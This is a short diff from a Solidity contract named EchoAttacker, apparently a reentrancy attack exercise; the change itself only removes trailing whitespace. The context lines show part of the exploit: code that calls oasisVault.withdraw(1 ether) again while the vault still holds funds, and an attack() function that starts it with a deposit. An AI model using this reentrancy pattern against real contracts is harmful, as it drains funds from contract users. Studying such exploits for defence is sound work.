@@ -19,7 +19,7 @@ contract EchoAttacker {
         if (address(oasisVault).balance >= 1 ether) {
             oasisVault.withdraw(1 ether);
         }
-    } 
+    }
 
     // Function to start the attack by depositing some Ether into the vault
     function attack() public payable {
